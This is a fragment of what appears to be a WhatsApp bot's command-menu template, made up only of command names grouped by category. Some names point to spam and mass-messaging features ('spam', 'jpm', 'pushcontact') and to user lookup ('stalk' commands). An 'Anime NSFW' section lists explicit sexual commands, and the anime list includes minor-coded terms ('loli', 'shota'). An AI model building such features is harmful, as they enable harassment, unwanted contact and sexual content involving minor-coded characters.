┋⍟┃ ${prefix}unavailable 
┋⍟┃ ${prefix}autorecord 
┋⍟┃ ${prefix}autorecordtype 
┋⍟┃ ${prefix}autoswview 
┋⍟┃ ${prefix}setautoblock 
┋⍟┃ ${prefix}setantiforeign 
┋⍟┃ ${prefix}autoblock 
┋⍟┃ ${prefix}onlygc 
┋⍟┃ ${prefix}onlypc 
┋⍟┃ ${prefix}onlyindia 
┋⍟┃ ${prefix}onlyindo 
┋⍟┃ ${prefix}anticall 
┋⍟┃ ${prefix}self 
┋⍟┃ ${prefix}public 
┋⍟┃ ${prefix}join 
┋⍟┃ ${prefix}poll 
┋⍟┃ ${prefix}spam 
┋⍟┃ ${prefix}bc 
┋⍟┃ ${prefix}bcgroup 
┋⍟┃ ${prefix}setmenu 
┋⍟┃ ${prefix}setimgmenu 
┋⍟┃ ${prefix}setvidmenu 
┋⍟┃ ${prefix}setgifmenu 
┋⍟┃ ${prefix}setreply 
┋⍟┃ ${prefix}setprefix 
┋⍟┃ ${prefix}addlimit 
┋⍟┃ ${prefix}dellimit 
┋⍟┃ ${prefix}resethit 
┋⍟┃ ${prefix}resetuser 
┋⍟┃ ${prefix}creategc 
┋⍟┃ ${prefix}setexif 
┋⍟┃ ${prefix}userjid 
┋⍟┃ ${prefix}setbotbio 
┋⍟┃ ${prefix}delppbot 
┋⍟┃ ${prefix}shutdown 
┋⍟┃ ${prefix}setppbot 
┋⍟┃ ${prefix}addprem 
┋⍟┃ ${prefix}delprem 
┋⍟┃ ${prefix}addowner 
┋⍟┃ ${prefix}delowner 
┋⍟┃ ${prefix}addvn 
┋⍟┃ ${prefix}addapk 
┋⍟┃ ${prefix}addzip 
┋⍟┃ ${prefix}addpdf 
┋⍟┃ ${prefix}delapk 
┋⍟┃ ${prefix}delzip 
┋⍟┃ ${prefix}delpdf 
┋⍟┃ ${prefix}delvn 
┋⍟┃ ${prefix}addsticker 
┋⍟┃ ${prefix}delsticker 
┋⍟┃ ${prefix}addimage 
┋⍟┃ ${prefix}delimage 
┋⍟┃ ${prefix}addvideo 
┋⍟┃ ${prefix}delvideo 
┋⍟┃ ${prefix}addtitle 
┋⍟┃ ${prefix}deltitle 
┋⍟┃ ${prefix}upswtext 
┋⍟┃ ${prefix}upswvideo 
┋⍟┃ ${prefix}upswimage 
┋⍟┃ ${prefix}upswaudio 
┋⍟┃ ${prefix}autosticker 
┋⍟┃ ${prefix}block 
┋⍟┃ ${prefix}unblock 
┋⍟┃ ${prefix}leavegc 
┋⍟┃ ${prefix}pushcontact 
┋⍟┃ ${prefix}pushcontactv2 
┋⍟┃ ${prefix}pushcontactv3 
┋⍟┃ ${prefix}jpm 
┋⍟┃ ${prefix}post 
┋⍟┃ ${prefix}clearall 
┋⍟┃ ${prefix}pinchat 
┋⍟┃ ${prefix}unpinchat 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Group Menu* *❂⊷*
╏✺╭─────────────❂   
┋⍟┃ ${prefix}antibot 
┋⍟┃ ${prefix}antiviewonce 
┋⍟┃ ${prefix}readviewonce 
┋⍟┃ ${prefix}welcome 
┋⍟┃ ${prefix}adminevent 
┋⍟┃ ${prefix}groupevent 
┋⍟┃ ${prefix}antiforeign 
┋⍟┃ ${prefix}antimedia 
┋⍟┃ ${prefix}antiaudio 
┋⍟┃ ${prefix}antivideo 
┋⍟┃ ${prefix}antiimage 
┋⍟┃ ${prefix}antidocument 
┋⍟┃ ${prefix}antilocation 
┋⍟┃ ${prefix}anticontact 
┋⍟┃ ${prefix}antisticker 
┋⍟┃ ${prefix}antipoll 
┋⍟┃ ${prefix}antilink 
┋⍟┃ ${prefix}antilinkgc 
┋⍟┃ ${prefix}antipromotion 
┋⍟┃ ${prefix}antivirtex 
┋⍟┃ ${prefix}grouplink 
┋⍟┃ ${prefix}listadmin 
┋⍟┃ ${prefix}invite 
┋⍟┃ ${prefix}ephemeral 
┋⍟┃ ${prefix}delete 
┋⍟┃ ${prefix}setppgroup 
┋⍟┃ ${prefix}delppgroup 
┋⍟┃ ${prefix}setnamegc 
┋⍟┃ ${prefix}setdesc 
┋⍟┃ ${prefix}add 
┋⍟┃ ${prefix}kick 
┋⍟┃ ${prefix}promote 
┋⍟┃ ${prefix}demote 
┋⍟┃ ${prefix}kickall 
┋⍟┃ ${prefix}promoteall 
┋⍟┃ ${prefix}demoteall 
┋⍟┃ ${prefix}getcontact 
┋⍟┃ ${prefix}savecontact 
┋⍟┃ ${prefix}sendcontact 
┋⍟┃ ${prefix}contactag 
┋⍟┃ ${prefix}hidetag 
┋⍟┃ ${prefix}totag 
┋⍟┃ ${prefix}tagall 
┋⍟┃ ${prefix}editinfo 
┋⍟┃ ${prefix}opentime 
┋⍟┃ ${prefix}closetime 
┋⍟┃ ${prefix}resetlink 
┋⍟┃ ${prefix}getbio 
┋⍟┃ ${prefix}vote 
┋⍟┃ ${prefix}upvote 
┋⍟┃ ${prefix}downvote 
┋⍟┃ ${prefix}checkvote 
┋⍟┃ ${prefix}delvote 
┋⍟┃ ${prefix}antivirus 
┋⍟┃ ${prefix}antitoxic 
┋⍟┃ ${prefix}nsfw 
┋⍟┃ ${prefix}react 
┋⍟┃ ${prefix}getjoinrequest 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Search* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}google 
┋⍟┃ ${prefix}wikipedia 
┋⍟┃ ${prefix}ytsearch 
┋⍟┃ ${prefix}xnxxsearch 
┋⍟┃ ${prefix}xvideosearch 
┋⍟┃ ${prefix}apksearch 
┋⍟┃ ${prefix}stickersearch 
┋⍟┃ ${prefix}imdb 
┋⍟┃ ${prefix}wanumber 
┋⍟┃ ${prefix}friend 
┋⍟┃ ${prefix}lyrics 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Download Menu* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}xnxxdl 
┋⍟┃ ${prefix}xvideodl 
┋⍟┃ ${prefix}itunes 
┋⍟┃ ${prefix}play 
┋⍟┃ ${prefix}ytmp3 
┋⍟┃ ${prefix}ytmp4 
┋⍟┃ ${prefix}tiktok 
┋⍟┃ ${prefix}tiktokaudio 
┋⍟┃ ${prefix}tiktokvideo 
┋⍟┃ ${prefix}tiktokslide 
┋⍟┃ ${prefix}igvideo 
┋⍟┃ ${prefix}igimage 
┋⍟┃ ${prefix}facebook 
┋⍟┃ ${prefix}twitter 
┋⍟┃ ${prefix}capcut 
┋⍟┃ ${prefix}apk 
┋⍟┃ ${prefix}mega 
┋⍟┃ ${prefix}mediafire 
┋⍟┃ ${prefix}google 
┋⍟┃ ${prefix}gimage 
┋⍟┃ ${prefix}weather 
┋⍟┃ ${prefix}spotify 
┋⍟┃ ${prefix}gitclone 
┋⍟┃ ${prefix}happymod 
┋⍟┃ ${prefix}gdrive 
┋⍟┃ ${prefix}pinterest 
┋⍟┃ ${prefix}ringtone 
┋⍟┃ ${prefix}autodownload 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Convert* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}obfuscate 
┋⍟┃ ${prefix}styletext 
┋⍟┃ ${prefix}fliptext 
┋⍟┃ ${prefix}tts 
┋⍟┃ ${prefix}say 
┋⍟┃ ${prefix}togif 
┋⍟┃ ${prefix}toqr 
┋⍟┃ ${prefix}bass 
┋⍟┃ ${prefix}blown 
┋⍟┃ ${prefix}deep 
┋⍟┃ ${prefix}earrape 
┋⍟┃ ${prefix}fast 
┋⍟┃ ${prefix}fat 
┋⍟┃ ${prefix}nightcore 
┋⍟┃ ${prefix}reverse 
┋⍟┃ ${prefix}robot 
┋⍟┃ ${prefix}slow 
┋⍟┃ ${prefix}smooth 
┋⍟┃ ${prefix}squirrel 
┋⍟┃ ${prefix}tinyurl 
┋⍟┃ ${prefix}tovn 
┋⍟┃ ${prefix}toaudio 
┋⍟┃ ${prefix}tomp3 
┋⍟┃ ${prefix}tomp4
┋⍟┃ ${prefix}toimg 
┋⍟┃ ${prefix}toonce 
┋⍟┃ ${prefix}sticker 
┋⍟┃ ${prefix}smeme 
┋⍟┃ ${prefix}smeta 
┋⍟┃ ${prefix}take 
┋⍟┃ ${prefix}emoji 
┋⍟┃ ${prefix}volaudio 
┋⍟┃ ${prefix}volvideo 
┋⍟┃ ${prefix}ebinary 
┋⍟┃ ${prefix}dbinary 
┋⍟┃ ${prefix}ssweb 
┋⍟┃ ${prefix}quoted 
┋⍟┃ ${prefix}translate 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *List* *❂⊷*
╏✺╭─────────────❂   
┋⍟┃ ${prefix}listprem 
┋⍟┃ ${prefix}listowner 
┋⍟┃ ${prefix}liststicker 
┋⍟┃ ${prefix}listimage 
┋⍟┃ ${prefix}listvideo 
┋⍟┃ ${prefix}listvn 
┋⍟┃ ${prefix}listapk 
┋⍟┃ ${prefix}listzip 
┋⍟┃ ${prefix}listpdf 
┋⍟┃ ${prefix}listbadword 
┋⍟┃ ${prefix}listpc 
┋⍟┃ ${prefix}listgc 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Random Photo* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}aesthetic 
┋⍟┃ ${prefix}coffee 
┋⍟┃ ${prefix}wikimedia 
┋⍟┃ ${prefix}wallpaper 
┋⍟┃ ${prefix}art 
┋⍟┃ ${prefix}bts 
┋⍟┃ ${prefix}dogwoof 
┋⍟┃ ${prefix}catmeow 
┋⍟┃ ${prefix}lizardpic 
┋⍟┃ ${prefix}goosebird 
┋⍟┃ ${prefix}8ballpool 
┋⍟┃ ${prefix}cosplay 
┋⍟┃ ${prefix}hacker 
┋⍟┃ ${prefix}cyber 
┋⍟┃ ${prefix}gamewallpaper 
┋⍟┃ ${prefix}islamic 
┋⍟┃ ${prefix}jennie 
┋⍟┃ ${prefix}jiso 
┋⍟┃ ${prefix}satanic 
┋⍟┃ ${prefix}justina 
┋⍟┃ ${prefix}cartoon 
┋⍟┃ ${prefix}pentol 
┋⍟┃ ${prefix}cat 
┋⍟┃ ${prefix}kpop 
┋⍟┃ ${prefix}exo 
┋⍟┃ ${prefix}lisa 
┋⍟┃ ${prefix}space 
┋⍟┃ ${prefix}car 
┋⍟┃ ${prefix}technology 
┋⍟┃ ${prefix}bike 
┋⍟┃ ${prefix}shortquote 
┋⍟┃ ${prefix}antiwork 
┋⍟┃ ${prefix}hacking 
┋⍟┃ ${prefix}boneka 
┋⍟┃ ${prefix}rose 
┋⍟┃ ${prefix}ryujin 
┋⍟┃ ${prefix}ulzzangboy 
┋⍟┃ ${prefix}ulzzanggirl 
┋⍟┃ ${prefix}wallml 
┋⍟┃ ${prefix}wallphone 
┋⍟┃ ${prefix}mountain 
┋⍟┃ ${prefix}goose 
┋⍟┃ ${prefix}profilepic 
┋⍟┃ ${prefix}couplepp 
┋⍟┃ ${prefix}programming 
┋⍟┃ ${prefix}pubg 
┋⍟┃ ${prefix}blackpink 
┋⍟┃ ${prefix}randomboy   
┋⍟┃ ${prefix}randomgirl 
┋⍟┃ ${prefix}hijab   
┋⍟┃ ${prefix}chinese 
┋⍟┃ ${prefix}indo 
┋⍟┃ ${prefix}japanese 
┋⍟┃ ${prefix}korean 
┋⍟┃ ${prefix}malay 
┋⍟┃ ${prefix}thai 
┋⍟┃ ${prefix}vietnamese 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Random Video* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}tiktokgirl 
┋⍟┃ ${prefix}tiktoknukthy 
┋⍟┃ ${prefix}tiktokkayes 
┋⍟┃ ${prefix}tiktokpanrika 
┋⍟┃ ${prefix}tiktoknotnot 
┋⍟┃ ${prefix}tiktokghea 
┋⍟┃ ${prefix}tiktoksantuy 
┋⍟┃ ${prefix}tiktokbocil 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Stalker* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}tiktokstalk 
┋⍟┃ ${prefix}mlstalk 
┋⍟┃ ${prefix}npmstalk 
┋⍟┃ ${prefix}ghstalk 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *OpenAI* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}openai-indo 
┋⍟┃ ${prefix}indo-ai 
┋⍟┃ ${prefix}diffusion 
┋⍟┃ ${prefix}photoleap 
┋⍟┃ ${prefix}openai 
┋⍟┃ ${prefix}dalle 
┋⍟┃ ${prefix}ai 
┋⍟┃ ${prefix}remini 
┋⍟┃ ${prefix}simi 
┋⍟┃ ${prefix}removebg 
┋⍟┃ ${prefix}tozombie 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Game* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}truth 
┋⍟┃ ${prefix}dare 
┋⍟┃ ${prefix}suit 
┋⍟┃ ${prefix}tictactoe 
┋⍟┃ ${prefix}math 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Fun Menu* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}define 
┋⍟┃ ${prefix}readmore 
┋⍟┃ ${prefix}fact 
┋⍟┃ ${prefix}couple 
┋⍟┃ ${prefix}soulmate 
┋⍟┃ ${prefix}stupidcheck 
┋⍟┃ ${prefix}handsomecheck 
┋⍟┃ ${prefix}uncleancheck 
┋⍟┃ ${prefix}hotcheck 
┋⍟┃ ${prefix}smartcheck 
┋⍟┃ ${prefix}greatcheck 
┋⍟┃ ${prefix}evilcheck 
┋⍟┃ ${prefix}dogcheck 
┋⍟┃ ${prefix}coolcheck 
┋⍟┃ ${prefix}waifucheck 
┋⍟┃ ${prefix}awesomecheck 
┋⍟┃ ${prefix}gaycheck 
┋⍟┃ ${prefix}cutecheck 
┋⍟┃ ${prefix}lesbiancheck 
┋⍟┃ ${prefix}hornycheck 
┋⍟┃ ${prefix}prettycheck 
┋⍟┃ ${prefix}lovelycheck 
┋⍟┃ ${prefix}uglycheck 
┋⍟┃ ${prefix}pick 
┋⍟┃ ${prefix}pickupline 
┋⍟┃ ${prefix}quotes 
┋⍟┃ ${prefix}can 
┋⍟┃ ${prefix}is 
┋⍟┃ ${prefix}when 
┋⍟┃ ${prefix}where 
┋⍟┃ ${prefix}what 
┋⍟┃ ${prefix}how 
┋⍟┃ ${prefix}rate 
┋⍟┃ ${prefix}cry 
┋⍟┃ ${prefix}kill 
┋⍟┃ ${prefix}hug 
┋⍟┃ ${prefix}pat 
┋⍟┃ ${prefix}lick  
┋⍟┃ ${prefix}kiss 
┋⍟┃ ${prefix}bite 
┋⍟┃ ${prefix}yeet 
┋⍟┃ ${prefix}bully 
┋⍟┃ ${prefix}bonk 
┋⍟┃ ${prefix}wink 
┋⍟┃ ${prefix}poke 
┋⍟┃ ${prefix}nom 
┋⍟┃ ${prefix}slap 
┋⍟┃ ${prefix}smile  
┋⍟┃ ${prefix}wave 
┋⍟┃ ${prefix}awoo 
┋⍟┃ ${prefix}blush 
┋⍟┃ ${prefix}smug 
┋⍟┃ ${prefix}glomp  
┋⍟┃ ${prefix}happy 
┋⍟┃ ${prefix}dance 
┋⍟┃ ${prefix}cringe 
┋⍟┃ ${prefix}cuddle 
┋⍟┃ ${prefix}highfive  
┋⍟┃ ${prefix}handhold 
┋⍟┃ ${prefix}spank 
┋⍟┃ ${prefix}tickle 
┋⍟┃ ${prefix}feed 
┋⍟┃ ${prefix}checkme 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Sticker* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}goose 
┋⍟┃ ${prefix}woof 
┋⍟┃ ${prefix}8ball 
┋⍟┃ ${prefix}lizard 
┋⍟┃ ${prefix}meow 
┋⍟┃ ${prefix}gura 
┋⍟┃ ${prefix}telestick 
┋⍟┃ ${prefix}ttp 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Anime* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}stickhandhold 
┋⍟┃ ${prefix}stickshinobu 
┋⍟┃ ${prefix}stickcuddle 
┋⍟┃ ${prefix}stickhighfive 
┋⍟┃ ${prefix}stickdance 
┋⍟┃ ${prefix}stickcringe 
┋⍟┃ ${prefix}stickhappy 
┋⍟┃ ${prefix}stickglomp 
┋⍟┃ ${prefix}sticksmug 
┋⍟┃ ${prefix}stickblush 
┋⍟┃ ${prefix}stickawoo 
┋⍟┃ ${prefix}stickwave 
┋⍟┃ ${prefix}sticksmile 
┋⍟┃ ${prefix}stickslap 
┋⍟┃ ${prefix}stickpoke 
┋⍟┃ ${prefix}stickwink 
┋⍟┃ ${prefix}stickbonk 
┋⍟┃ ${prefix}stickbully 
┋⍟┃ ${prefix}stickyeet 
┋⍟┃ ${prefix}stickbike 
┋⍟┃ ${prefix}stickkiss 
┋⍟┃ ${prefix}sticklick 
┋⍟┃ ${prefix}stickpat 
┋⍟┃ ${prefix}stickhug 
┋⍟┃ ${prefix}stickkill 
┋⍟┃ ${prefix}stickcry 
┋⍟┃ ${prefix}stickspank 
┋⍟┃ ${prefix}sticktickle 
┋⍟┃ ${prefix}traceanime 
┋⍟┃ ${prefix}akira 
┋⍟┃ ${prefix}akiyama 
┋⍟┃ ${prefix}ana 
┋⍟┃ ${prefix}asuna 
┋⍟┃ ${prefix}ayuzawa 
┋⍟┃ ${prefix}boruto 
┋⍟┃ ${prefix}chiho 
┋⍟┃ ${prefix}chitoge 
┋⍟┃ ${prefix}cosplayloli 
┋⍟┃ ${prefix}cosplaysagiri 
┋⍟┃ ${prefix}deidara 
┋⍟┃ ${prefix}doraemon 
┋⍟┃ ${prefix}elaina 
┋⍟┃ ${prefix}emilia 
┋⍟┃ ${prefix}erza 
┋⍟┃ ${prefix}gremory 
┋⍟┃ ${prefix}hestia 
┋⍟┃ ${prefix}husbu 
┋⍟┃ ${prefix}inori 
┋⍟┃ ${prefix}isuzu 
┋⍟┃ ${prefix}itachi 
┋⍟┃ ${prefix}itori 
┋⍟┃ ${prefix}kaga 
┋⍟┃ ${prefix}kagura 
┋⍟┃ ${prefix}kakasih 
┋⍟┃ ${prefix}kaori 
┋⍟┃ ${prefix}keneki 
┋⍟┃ ${prefix}kotori 
┋⍟┃ ${prefix}kurumi 
┋⍟┃ ${prefix}loli 
┋⍟┃ ${prefix}loli2 
┋⍟┃ ${prefix}madara 
┋⍟┃ ${prefix}megumin 
┋⍟┃ ${prefix}mikasa 
┋⍟┃ ${prefix}mikey 
┋⍟┃ ${prefix}miku 
┋⍟┃ ${prefix}minato 
┋⍟┃ ${prefix}naruto 
┋⍟┃ ${prefix}neko 
┋⍟┃ ${prefix}nekonime 
┋⍟┃ ${prefix}nezuko 
┋⍟┃ ${prefix}onepiece 
┋⍟┃ ${prefix}pokemon 
┋⍟┃ ${prefix}randomnime 
┋⍟┃ ${prefix}randomnime2 
┋⍟┃ ${prefix}rize 
┋⍟┃ ${prefix}sagiri 
┋⍟┃ ${prefix}sakura 
┋⍟┃ ${prefix}sasuke 
┋⍟┃ ${prefix}shina 
┋⍟┃ ${prefix}shinka 
┋⍟┃ ${prefix}shinomiya 
┋⍟┃ ${prefix}shizuka 
┋⍟┃ ${prefix}shota 
┋⍟┃ ${prefix}tejina 
┋⍟┃ ${prefix}toukachan 
┋⍟┃ ${prefix}tsunade 
┋⍟┃ ${prefix}waifu 
┋⍟┃ ${prefix}waifu2 
┋⍟┃ ${prefix}animewall 
┋⍟┃ ${prefix}yotsuba 
┋⍟┃ ${prefix}yuki 
┋⍟┃ ${prefix}yulibocil 
┋⍟┃ ${prefix}yumeko 
┋⍟┃ ${prefix}8ball 
┋⍟┃ ${prefix}animeawoo 
┋⍟┃ ${prefix}animemegumin 
┋⍟┃ ${prefix}animeshinobu 
┋⍟┃ ${prefix}animehandhold 
┋⍟┃ ${prefix}animehighfive 
┋⍟┃ ${prefix}animecringe 
┋⍟┃ ${prefix}animedance 
┋⍟┃ ${prefix}animehappy 
┋⍟┃ ${prefix}animeglomp 
┋⍟┃ ${prefix}animeblush 
┋⍟┃ ${prefix}animesmug 
┋⍟┃ ${prefix}animewave 
┋⍟┃ ${prefix}animesmille 
┋⍟┃ ${prefix}animepoke 
┋⍟┃ ${prefix}animewink 
┋⍟┃ ${prefix}animebonk 
┋⍟┃ ${prefix}animebully 
┋⍟┃ ${prefix}animeyeet 
┋⍟┃ ${prefix}animebite 
┋⍟┃ ${prefix}animelick 
┋⍟┃ ${prefix}animekill 
┋⍟┃ ${prefix}animecry 
┋⍟┃ ${prefix}animewlp 
┋⍟┃ ${prefix}animekiss 
┋⍟┃ ${prefix}animehug 
┋⍟┃ ${prefix}animeneko 
┋⍟┃ ${prefix}animepat 
┋⍟┃ ${prefix}animeslap 
┋⍟┃ ${prefix}animecuddle 
┋⍟┃ ${prefix}animewaifu 
┋⍟┃ ${prefix}animenom 
┋⍟┃ ${prefix}animefoxgirl 
┋⍟┃ ${prefix}animegecg 
┋⍟┃ ${prefix}animetickle 
┋⍟┃ ${prefix}animefeed 
┋⍟┃ ${prefix}animeavatar 
┋⍟┃ ${prefix}anime 
┋⍟┃ ${prefix}avatar 
┋⍟┃ ${prefix}shinobu 
┋⍟┃ ${prefix}fox_girl 
┋⍟┃ ${prefix}gecg 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Anime NSFW* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}hentai 
┋⍟┃ ${prefix}gifblowjob 
┋⍟┃ ${prefix}hentaivid 
┋⍟┃ ${prefix}hneko 
┋⍟┃ ${prefix}nwaifu 
┋⍟┃ ${prefix}animespank 
┋⍟┃ ${prefix}trap 
┋⍟┃ ${prefix}blowjob 
┋⍟┃ ${prefix}cuckold 
┋⍟┃ ${prefix}milf 
┋⍟┃ ${prefix}eba 
┋⍟┃ ${prefix}pussy 
┋⍟┃ ${prefix}yuri 
┋⍟┃ ${prefix}zettai 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *PhotoOxy Maker* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}shadow  
┋⍟┃ ${prefix}write  
┋⍟┃ ${prefix}romantic  
┋⍟┃ ${prefix}burnpaper 
┋⍟┃ ${prefix}smoke  
┋⍟┃ ${prefix}narutobanner  
┋⍟┃ ${prefix}love  
┋⍟┃ ${prefix}undergrass 
┋⍟┃ ${prefix}doublelove  
┋⍟┃ ${prefix}coffecup 
┋⍟┃ ${prefix}underwaterocean 
┋⍟┃ ${prefix}smokyneon 
┋⍟┃ ${prefix}starstext 
┋⍟┃ ${prefix}rainboweffect 
┋⍟┃ ${prefix}balloontext 
┋⍟┃ ${prefix}metalliceffect 
┋⍟┃ ${prefix}embroiderytext 
┋⍟┃ ${prefix}flamingtext 
┋⍟┃ ${prefix}stonetext 
┋⍟┃ ${prefix}writeart 
┋⍟┃ ${prefix}summertext 
┋⍟┃ ${prefix}wolfmetaltext 
┋⍟┃ ${prefix}nature3dtext 
┋⍟┃ ${prefix}rosestext 
┋⍟┃ ${prefix}naturetypography 
┋⍟┃ ${prefix}quotesunder 
┋⍟┃ ${prefix}shinetext 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Database* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}setcmd 
┋⍟┃ ${prefix}delcmd 
┋⍟┃ ${prefix}listcmd 
┋⍟┃ ${prefix}lockcmd 
┋⍟┃ ${prefix}addmsg 
┋⍟┃ ${prefix}delmsg 
┋⍟┃ ${prefix}getmsg 
┋⍟┃ ${prefix}listmsg 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Store* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}list 
┋⍟┃ ${prefix}store 
┋⍟┃ ${prefix}shop 
┋⍟┃ ${prefix}addlist 
┋⍟┃ ${prefix}dellist 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Religon* *❂⊷* 
╏✺╭─────────────❂
┋⍟┃ ${prefix}gita 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *𝐒𝐨𝐮𝐧𝐝 𝐌𝐞𝐧𝐮* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}sound1
┋⍟┃ ${prefix}sound2
┋⍟┃ ${prefix}sound3
┋⍟┃ ${prefix}sound4
┋⍟┃ ${prefix}sound5
┋⍟┃ ${prefix}sound6
┋⍟┃ ${prefix}sound7
┋⍟┃ ${prefix}sound8
┋⍟┃ ${prefix}sound9
┋⍟┃ ${prefix}sound10
┋⍟┃ ${prefix}sound11
┋⍟┃ ${prefix}sound12
┋⍟┃ ${prefix}sound13
┋⍟┃ ${prefix}sound14
┋⍟┃ ${prefix}sound15
┋⍟┃ ${prefix}sound16
┋⍟┃ ${prefix}sound17
┋⍟┃ ${prefix}sound18
┋⍟┃ ${prefix}sound19
┋⍟┃ ${prefix}sound20
┋⍟┃ ${prefix}sound21
┋⍟┃ ${prefix}sound22
┋⍟┃ ${prefix}sound23
┋⍟┃ ${prefix}sound24
┋⍟┃ ${prefix}sound25
┋⍟┃ ${prefix}sound26
┋⍟┃ ${prefix}sound27
┋⍟┃ ${prefix}sound28
┋⍟┃ ${prefix}sound29
┋⍟┃ ${prefix}sound30
┋⍟┃ ${prefix}sound31
┋⍟┃ ${prefix}sound32
┋⍟┃ ${prefix}sound33
┋⍟┃ ${prefix}sound34
┋⍟┃ ${prefix}sound35
┋⍟┃ ${prefix}sound36
┋⍟┃ ${prefix}sound37
┋⍟┃ ${prefix}sound38
┋⍟┃ ${prefix}sound39
┋⍟┃ ${prefix}sound40
┋⍟┃ ${prefix}sound41
┋⍟┃ ${prefix}sound42
┋⍟┃ ${prefix}sound43
┋⍟┃ ${prefix}sound44
┋⍟┃ ${prefix}sound45
┋⍟┃ ${prefix}sound46
┋⍟┃ ${prefix}sound47
┋⍟┃ ${prefix}sound48
┋⍟┃ ${prefix}sound49
┋⍟┃ ${prefix}sound50
┋⍟┃ ${prefix}sound51
┋⍟┃ ${prefix}sound52
┋⍟┃ ${prefix}sound53
┋⍟┃ ${prefix}sound54
┋⍟┃ ${prefix}sound55
┋⍟┃ ${prefix}sound56
┋⍟┃ ${prefix}sound57
┋⍟┃ ${prefix}sound58
┋⍟┃ ${prefix}sound59
┋⍟┃ ${prefix}sound60
┋⍟┃ ${prefix}sound61
┋⍟┃ ${prefix}sound62
┋⍟┃ ${prefix}sound63
┋⍟┃ ${prefix}sound64
┋⍟┃ ${prefix}sound65
┋⍟┃ ${prefix}sound66
┋⍟┃ ${prefix}sound67
┋⍟┃ ${prefix}sound68
┋⍟┃ ${prefix}sound69
┋⍟┃ ${prefix}sound70
┋⍟┃ ${prefix}sound71
┋⍟┃ ${prefix}sound72
┋⍟┃ ${prefix}sound73
┋⍟┃ ${prefix}sound74
┋⍟┃ ${prefix}sound75
┋⍟┃ ${prefix}sound76
┋⍟┃ ${prefix}sound77
┋⍟┃ ${prefix}sound78
┋⍟┃ ${prefix}sound79
┋⍟┃ ${prefix}sound80
┋⍟┃ ${prefix}sound81
┋⍟┃ ${prefix}sound82
┋⍟┃ ${prefix}sound83
┋⍟┃ ${prefix}sound84
┋⍟┃ ${prefix}sound85
┋⍟┃ ${prefix}sound86
┋⍟┃ ${prefix}sound87
┋⍟┃ ${prefix}sound88
┋⍟┃ ${prefix}sound89
┋⍟┃ ${prefix}sound90
┋⍟┃ ${prefix}sound91
┋⍟┃ ${prefix}sound92
┋⍟┃ ${prefix}sound93
┋⍟┃ ${prefix}sound94
┋⍟┃ ${prefix}sound95
┋⍟┃ ${prefix}sound96
┋⍟┃ ${prefix}sound97
┋⍟┃ ${prefix}sound98
┋⍟┃ ${prefix}sound99
┋⍟┃ ${prefix}sound100
┋⍟┃ ${prefix}sound101
┋⍟┃ ${prefix}sound102
┋⍟┃ ${prefix}sound103
┋⍟┃ ${prefix}sound104
┋⍟┃ ${prefix}sound105
┋⍟┃ ${prefix}sound106
┋⍟┃ ${prefix}sound107
┋⍟┃ ${prefix}sound108
┋⍟┃ ${prefix}sound109
┋⍟┃ ${prefix}sound110
┋⍟┃ ${prefix}sound111
┋⍟┃ ${prefix}sound112
┋⍟┃ ${prefix}sound113
┋⍟┃ ${prefix}sound114
┋⍟┃ ${prefix}sound115
┋⍟┃ ${prefix}sound116
┋⍟┃ ${prefix}sound117
┋⍟┃ ${prefix}sound118
┋⍟┃ ${prefix}sound119
┋⍟┃ ${prefix}sound120
┋⍟┃ ${prefix}sound121
┋⍟┃ ${prefix}sound122
┋⍟┃ ${prefix}sound123
┋⍟┃ ${prefix}sound124
┋⍟┃ ${prefix}sound125
┋⍟┃ ${prefix}sound126
┋⍟┃ ${prefix}sound127
┋⍟┃ ${prefix}sound128
┋⍟┃ ${prefix}sound129
┋⍟┃ ${prefix}sound130
┋⍟┃ ${prefix}sound131
┋⍟┃ ${prefix}sound132
┋⍟┃ ${prefix}sound133
┋⍟┃ ${prefix}sound134
┋⍟┃ ${prefix}sound135
┋⍟┃ ${prefix}sound136
┋⍟┃ ${prefix}sound137
┋⍟┃ ${prefix}sound138
┋⍟┃ ${prefix}sound139
┋⍟┃ ${prefix}sound140
┋⍟┃ ${prefix}sound141
┋⍟┃ ${prefix}sound142
┋⍟┃ ${prefix}sound143
┋⍟┃ ${prefix}sound144
┋⍟┃ ${prefix}sound145
┋⍟┃ ${prefix}sound146
┋⍟┃ ${prefix}sound147
┋⍟┃ ${prefix}sound148
┋⍟┃ ${prefix}sound149
┋⍟┃ ${prefix}sound150
┋⍟┃ ${prefix}sound151
┋⍟┃ ${prefix}sound152
┋⍟┃ ${prefix}sound153
┋⍟┃ ${prefix}sound154
